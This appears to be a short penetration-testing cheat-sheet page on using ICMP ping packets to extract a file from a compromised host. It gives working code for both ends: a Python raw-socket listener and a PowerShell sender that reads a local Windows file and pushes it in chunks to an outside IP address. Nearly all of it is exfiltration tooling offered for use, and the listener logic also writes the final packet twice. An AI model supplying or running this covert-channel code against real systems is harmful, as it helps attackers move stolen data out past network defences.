# ICMP

## Extracting a File

By sending ping packets from our server, with the start marked by `^BOF` and the end marked by `EOF` , we can set up an icmplistener as below which decodes the data packets and then writes them to our file.  This isn't as universal as metasploit's listener, but it servers as a quick and dirty poc if all you're looking to extract is a single file.

```py
import socket

def listen():
    s = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
    s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
    with open('icmpoutput.txt','wb') as catch:   
        while 1:
            data, addr = s.recvfrom(1508)
            print "Packet from %r: %r" % (addr,data)
            if '^BOF' in data:
                continue
            if '^EOF' in data:
                catch.write(data[-1472:-4])
            catch.write(data[-1472:])

listen()
```

A good option for recent Windows based systems is a modified [Powershell-ICMP-Sender](https://github.com/api0cradle/Powershell-ICMP).

```powershell
    $IPAddress = "192.168.0.5"
    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
    $PingOptions.DontFragment = $true
    #$PingOptions.Ttl = 10

    # Must be divided into 1472 chunks
    [int]$bufSize = 1472
    $inFile = "C:\Users\bob\Desktop\backfile"


    $stream = [System.IO.File]::OpenRead($inFile)
    $chunkNum = 0
    $TotalChunks = [math]::floor($stream.Length / 1472)
    $barr = New-Object byte[] $bufSize

    # Start of Transfer
    $sendbytes = ([text.encoding]::ASCII).GetBytes("^BOFbackfile")
    $ICMPClient.Send($IPAddress,10, $sendbytes, $PingOptions) | Out-Null


    while ($bytesRead = $stream.Read($barr, 0, $bufsize)) {
        $ICMPClient.Send($IPAddress,10, $barr, $PingOptions) | Out-Null
        $ICMPClient.PingCompleted

        #Missing check if transfer is okay, added sleep.
        sleep 2
        #$ICMPClient.SendAsync($IPAddress,60 * 1000, $barr, $PingOptions) | Out-Null
        Write-Output "Done with $chunkNum out of $TotalChunks"
        $chunkNum += 1
    }

    # End the transfer
    $sendbytes = ([text.encoding]::ASCII).GetBytes("^EOF")
    $ICMPClient.Send($IPAddress,10, $sendbytes, $PingOptions) | Out-Null
    Write-Output "File Transfered"
```



